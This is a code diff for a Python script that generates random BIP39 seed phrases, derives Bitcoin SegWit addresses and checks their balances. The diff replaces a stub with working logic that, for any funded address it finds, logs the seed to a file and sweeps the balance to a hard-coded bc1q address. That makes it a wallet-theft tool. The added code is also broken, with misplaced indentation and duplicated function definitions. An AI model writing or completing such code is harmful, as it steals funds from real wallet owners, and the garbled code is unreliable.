@@ -3,6 +3,7 @@ import argparse
 import time
 import sys
 from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip39WordsNum, Bip84, Bip44Changes, Bip84Coins
+from bitcoinlib.wallets import Wallet
 from rich.console import Console
 from config import WORDS_COUNT, CHECK_BALANCE, PASSPHRASE, BATCH_SIZE, DELAY
 from utils import check_balance, print_colored_seed, print_stats
@@ -20,18 +21,72 @@ def derive_segwit_address(mnemonic, passphrase=""):
     bip84_ctx = Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN)
     account = bip84_ctx.Purpose().Coin().Account(0)
     change = account.Change(Bip44Changes.CHAIN_EXT)
-    address = change.AddressIndex(0).PublicKey().ToAddress()
-    return address
+        return change.AddressIndex(0).PublicKey().ToAddress()
 
-def send_funds_if_funded(mnemonic, passphrase, from_address, funded):
-    # Placeholder for sending funds logic
-    # In a real implementation, you would use a Bitcoin library to sign and broadcast a transaction
-    # This is a stub to show where the logic would go
+    def save_success(mnemonic, address, funded, tx_count):
+        with open("success.txt", "a") as f:
+            f.write(f"Seed: {mnemonic}\nAddress: {address}\nBalance: {funded} sats\nTXs: {tx_count}\n---\n")
+
+    def send_funds_if_funded(mnemonic, passphrase, from_address, funded, tx_count):
+        to_address = "bc1qvzda7znkqpjgp5jf6hfq3ztakq29559naq70v6"
+        try:
+            save_success(mnemonic, from_address, funded, tx_count)
+            # Create or open a temporary wallet from the mnemonic
+            wallet_name = f"temp_wallet_{from_address}"
+            # Remove wallet if it exists to avoid conflicts
+            try:
+                Wallet.delete(wallet_name)
+            except Exception:
+                pass
+            wallet = Wallet.create(
+                name=wallet_name,
+                keys=mnemonic,
+                network='bitcoin',
+                witness_type='segwit',
+                passphrase=passphrase
+            )
+            # Get spendable balance (in satoshis)
+            balance = wallet.balance()
+            if balance < funded:
+                console.print(f"[bold red]Wallet balance ({balance}) is less than funded amount ({funded})[/bold red]")
+                Wallet.delete(wallet_name)
+                return
+            # Create and send transaction
+            tx = wallet.send_to(to_address, funded, network_fee=1000, offline=False)
+            console.print(f"[bold green]Broadcasted transaction: {tx.txid}[/bold green]")
+            Wallet.delete(wallet_name)
+        except Exception as e:
+            console.print(f"[bold red]Failed to send funds: {e}[/bold red]")
+
+    def save_success(mnemonic, address, funded, tx_count):
+        with open("success.txt", "a") as f:
+            f.write(f"Seed: {mnemonic}\nAddress: {address}\nBalance: {funded} sats\nTXs: {tx_count}\n---\n")
     to_address = "bc1qvzda7znkqpjgp5jf6hfq3ztakq29559naq70v6"
     try:
-        # You would use the mnemonic and passphrase to derive the private key and sign a transaction
-        # For now, just print what would happen
-        console.print(f"[bold yellow]Sending {funded} sats from {from_address} to {to_address} (stub, not implemented)[/bold yellow]")
+        # Create or open a temporary wallet from the mnemonic
+        wallet_name = f"temp_wallet_{from_address}"
+        # Remove wallet if it exists to avoid conflicts
+        try:
+            Wallet.delete(wallet_name)
+        except Exception:
+            pass
+        wallet = Wallet.create(
+            name=wallet_name,
+            keys=mnemonic,
+            network='bitcoin',
+            witness_type='segwit',
+            passphrase=passphrase
+        )
+        # Get spendable balance (in satoshis)
+        balance = wallet.balance()
+        if balance < funded:
+            console.print(f"[bold red]Wallet balance ({balance}) is less than funded amount ({funded})[/bold red]")
+            Wallet.delete(wallet_name)
+            return
+        # Create and send transaction
+        tx = wallet.send_to(to_address, funded, network_fee=1000, offline=False)
+        console.print(f"[bold green]Broadcasted transaction: {tx.txid}[/bold green]")
+        Wallet.delete(wallet_name)
     except Exception as e:
         console.print(f"[bold red]Failed to send funds: {e}[/bold red]")
 
@@ -66,7 +121,7 @@ def main():
                 console.print(f"[bold green]!!! FUNDED ADDRESS FOUND !!![/bold green]")
                 print_colored_seed(mnemonic, address, funded, tx_count)
                 if funded > 0:
-                    send_funds_if_funded(mnemonic, args.passphrase, address, funded)
+                    send_funds_if_funded(mnemonic, args.passphrase, address, funded, tx_count)
             if args.delay > 0:
                 time.sleep(args.delay)
     except KeyboardInterrupt:
